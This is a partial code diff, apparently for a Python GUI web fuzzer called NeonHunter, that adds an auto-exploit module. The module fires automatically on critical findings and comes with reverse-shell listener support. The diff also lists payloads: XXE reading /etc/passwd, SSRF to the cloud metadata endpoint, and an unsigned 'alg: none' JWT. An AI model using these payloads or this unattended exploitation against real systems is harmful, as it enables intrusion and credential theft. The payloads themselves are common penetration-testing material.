+5. Use 💥 AUTO-EXPLOIT for critical findings
 
 📖 USAGE GUIDE:
 • Single Target: Enter URL and scan
 • Batch Scanning: Load targets from file
 • Custom Payloads: Import your own payloads
 • Reporting: Generate professional reports
+• Exploitation: Auto-exploit critical vulnerabilities
 
 🔒 SECURITY NOTES:
 • Use only on authorized targets
 • Respect robots.txt
 • Follow ethical hacking guidelines
 • Get proper authorization
+• Auto-exploit only on authorized systems
 
 📞 SUPPORT:
 • GitHub: https://github.com/dkhacker707
@@ -3047,6 +3775,10 @@ Dickson Godwin Massawe
 ✅ Real-time Monitoring
 ✅ Screenshot Capture
 ✅ Advanced Detection Engine
+✅ 💥 AUTO-EXPLOIT MODULE
+✅ Reverse Shell Integration
+✅ Exploit Chain Capabilities
+✅ OWASP 2025 Coverage
 
 🎨 UI ENHANCEMENTS:
 ✅ Optimized for Better Visibility
@@ -3064,6 +3796,8 @@ Dickson Godwin Massawe
 • BeautifulSoup4 (Parsing)
 • Selenium (Screenshots)
 • Threading (Concurrency)
+• Paramiko (SSH)
+• Cryptography
 
 📊 REPORTING CAPABILITIES:
 • Professional HTML Reports
@@ -3310,7 +4044,9 @@ Great power comes with great responsibility!
                 'success': '#00ff88',
                 'error': '#ff0000',
                 'warning': '#ffa500',
-                'info': '#00ccff'
+                'info': '#00ccff',
+                'exploit': '#0000ff',
+                'shell': '#008000'
             })
             self.log("🎨 Color blind mode enabled")
         else:
@@ -3323,7 +4059,9 @@ Great power comes with great responsibility!
                 'success': '#00ff88',
                 'error': '#ff0000',
                 'warning': '#ffff00',
-                'info': '#00ccff'
+                'info': '#00ccff',
+                'exploit': '#ff0000',
+                'shell': '#00ff00'
             })
             self.log("🎨 Color blind mode disabled")
             
@@ -3512,6 +4250,8 @@ We appreciate your suggestions! 🌟
 4. Reporting and Analysis
 5. Custom Payload Creation
 6. Batch Scanning Workflow
+7. 💥 Auto-Exploit Module Guide
+8. Reverse Shell Techniques
 
 📖 WRITTEN GUIDES:
 • Installation Guide
@@ -3519,6 +4259,7 @@ We appreciate your suggestions! 🌟
 • Usage Examples
 • Troubleshooting
 • Best Practices
+• Ethical Hacking Guidelines
 
 🔗 RESOURCES:
 • Official Documentation: GitHub Wiki
@@ -3539,6 +4280,8 @@ We appreciate your suggestions! 🌟
 3. Practice with batch scanning
 4. Experiment with custom payloads
 5. Master reporting features
+6. Learn auto-exploit techniques
+7. Practice reverse shell handling
 
 💡 TIPS:
 • Always test on authorized targets
@@ -3546,6 +4289,7 @@ We appreciate your suggestions! 🌟
 • Review findings carefully
 • Document your process
 • Stay updated with new features
+• Use auto-exploit responsibly
 
 🚀 NEXT STEPS:
 1. Complete basic tutorials
@@ -3623,6 +4367,21 @@ We appreciate your suggestions! 🌟
                 vulnerable = True
                 evidence.append("Parameter pollution successful")
         
+        elif vuln_type == 'API_ABUSE':
+            if any(keyword in response.text.lower() for keyword in ['admin', 'role', 'permission', 'privilege']):
+                vulnerable = True
+                evidence.append("API abuse potential detected")
+
+        elif vuln_type == 'GRAPHQL':
+            if '__schema' in response.text or 'GraphQL' in response.headers.get('Content-Type', ''):
+                vulnerable = True
+                evidence.append("GraphQL endpoint detected")
+
+        elif vuln_type == 'WASM':
+            if 'wasm' in response.text.lower() or 'WebAssembly' in response.text:
+                vulnerable = True
+                evidence.append("WebAssembly usage detected")
+        
         return {'vulnerable': vulnerable, 'evidence': evidence}
         
     def process_vulnerability_result(self, result):
@@ -3635,6 +4394,12 @@ We appreciate your suggestions! 🌟
         
         if severity == 'Critical':
             self.stats['critical_findings'] += 1
+            # Auto-exploit critical vulnerabilities
+            self.root.after(100, lambda: self.auto_exploit_vulnerability(
+                result['vuln_type'],
+                result['url'].split('?')[0],
+                result['param']
+            ))
         
         finding = {
             'id': str(uuid.uuid4())[:8],
@@ -3668,10 +4433,16 @@ We appreciate your suggestions! 🌟
             'LFI': 'High',
             'SSTI': 'High',
             'XXE': 'High',
-            'SSRF': 'Medium',
+            'SSRF': 'High',
+            'RCE': 'Critical',
+            'File Upload': 'High',
+            'JWT': 'Medium',
+            'API Abuse': 'Medium',
+            'GraphQL': 'Medium',
+            'WASM': 'Low',
             'Open Redirect': 'Medium',
             'HPP': 'Medium',
-            'JWT': 'Low'
+            'Prototype Pollution': 'High'
         }
         
         base_severity = severity_map.get(vuln_type, 'Medium')
@@ -3749,8 +4520,16 @@ We appreciate your suggestions! 🌟
         
     def advanced_scan_complete(self):
         """Handle scan completion"""
-        self.stats['end_time'] = datetime.now()
-        duration = self.stats['end_time'] - self.stats['start_time']
+        # Use after() to ensure UI updates happen in main thread
+        self.root.after(0, self._advanced_scan_complete_ui)
+    
+    def _advanced_scan_complete_ui(self):
+        """UI update part of scan completion (runs in main thread)"""
+        if self.stats.get('start_time'):
+            self.stats['end_time'] = datetime.now()
+            duration = self.stats['end_time'] - self.stats['start_time']
+        else:
+            duration = 0
         
         self.progress.stop()
         self.fuzz_btn.config(state='normal')
@@ -3765,6 +4544,7 @@ We appreciate your suggestions! 🌟
 ❌ Errors: {self.stats['errors']}
 ⚠️ Critical Findings: {self.stats['critical_findings']}
 🔍 Total Vulnerabilities: {len(self.results)}
+💥 Auto-Exploits: {self.auto_exploit.success_count} successful
         """
         
         self.log(summary)
@@ -3797,7 +4577,10 @@ We appreciate your suggestions! 🌟
             'Command Injection': AdvancedPayloadGenerator.generate_command_injection_payloads(),
             'XXE': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
             'SSRF': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/admin'],
-            'JWT': ['eyJ0eXAiOiJKV1QiLCJhbGciOiJub25eIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'],
+            'JWT': ['eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'],
+            'API_ABUSE': list(self.auto_exploit.owasp_2025['api_abuse'].values()),
+            'GRAPHQL': list(self.auto_exploit.owasp_2025['graphql'].values()),
+            'WASM': list(self.auto_exploit.owasp_2025['wasm'].values()),
         })
         
         # Add custom payloads if they exist
@@ -3869,6 +4652,7 @@ We appreciate your suggestions! 🌟
 • Ctrl+R  - Clear monitors
 • Ctrl+S  - Save config
 • Ctrl+L  - Load config
+• Ctrl+X  - Auto-exploit
 • F1      - Show help
 • F5      - Check updates
 
@@ -3879,6 +4663,9 @@ We appreciate your suggestions! 🌟
 • Blind XSS server
 • Professional HTML reports
 • Concurrency control (1-10 threads)
+• 💥 AUTO-EXPLOIT MODULE
+• Reverse shell integration
+• Exploit chain capabilities
 
 📁 FILES GENERATED:
 • screenshots/ - Proof of Concept images
@@ -3903,6 +4690,10 @@ Ctrl+P  - Pause/Resume scan
 Ctrl+Q  - Stop scan
 Ctrl+B  - Start batch scan
 Ctrl+R  - Clear monitors
+
+💥 EXPLOITATION:
+Ctrl+X  - Auto-exploit current
+Alt+E   - Start exploit listener
 
 📊 REPORTING:
 Ctrl+E  - Export results
@@ -4140,6 +4931,7 @@ F5      - Check for updates
             <p>Target: {html_module.escape(target)}</p>
             <p>Scan Date: {timestamp}</p>
             <p>Total Vulnerabilities: {len(self.results)}</p>
+            <p>Auto-Exploits Successful: {self.auto_exploit.success_count}</p>
         </div>
         
         <h2>VULNERABILITIES FOUND:</h2>
@@ -4202,7 +4994,12 @@ F5      - Check for updates
             'timestamp': datetime.now().isoformat(),
             'total_vulnerabilities': len(self.results),
             'vulnerabilities': self.results,
-            'stats': self.stats
+            'stats': self.stats,
+            'exploit_stats': {
+                'success': self.auto_exploit.success_count,
+                'failed': self.auto_exploit.failed_count,
+                'listener_active': self.auto_exploit.listener_active
+            }
         }
         
         with open(filename, 'w', encoding='utf-8') as f:
@@ -4240,6 +5037,12 @@ Target: {self.target_entry.get()}
 • High: {self.stats['high_findings']}
 • Medium: {self.stats['medium_findings']}
 • Low: {self.stats['low_findings']}
+
+💥 EXPLOITATION STATS:
+• Successful Exploits: {self.auto_exploit.success_count}
+• Failed Exploits: {self.auto_exploit.failed_count}
+• Listener Active: {'Yes' if self.auto_exploit.listener_active else 'No'}
+• Listener Port: {self.auto_exploit.lport}
 
 📋 VULNERABILITY BREAKDOWN:
 """
@@ -4282,6 +5085,11 @@ Target: {self.target_entry.get()}
 • High: {self.stats['high_findings']}
 • Medium: {self.stats['medium_findings']}
 • Low: {self.stats['low_findings']}
+
+💥 EXPLOITATION:
+• Successful: {self.auto_exploit.success_count}
+• Failed: {self.auto_exploit.failed_count}
+• Listener: {'Active' if self.auto_exploit.listener_active else 'Inactive'}
 
 📈 SUCCESS RATE: 
 """
@@ -4488,7 +5296,11 @@ Target: {self.target_entry.get()}
                 'timestamp': timestamp,
                 'target': self.target_entry.get(),
                 'results': self.results,
-                'stats': self.stats
+                'stats': self.stats,
+                'exploit_stats': {
+                    'success': self.auto_exploit.success_count,
+                    'failed': self.auto_exploit.failed_count
+                }
             }
             
             with open(backup_file, 'w') as f:
@@ -4541,6 +5353,12 @@ Target: {self.target_entry.get()}
     def on_closing(self):
         """Handle application closing"""
         if messagebox.askyesno("Exit", "Are you sure you want to exit NeonHunter?"):
+            # Stop any running scan first
+            if self.is_running:
+                self.stop_fuzz()
+                # Wait a bit for threads to clean up
+                time.sleep(1)
+            
             self.save_config()
             
             if hasattr(self, 'blind_server') and self.blind_server:
@@ -4553,6 +5371,7 @@ Target: {self.target_entry.get()}
         if hasattr(self, 'live_monitor') and self.live_monitor:
             self.live_monitor.clear_logs()
         self.log("🧹 Monitors cleared")
+
 if __name__ == "__main__":
     root = tk.Tk()
     try:
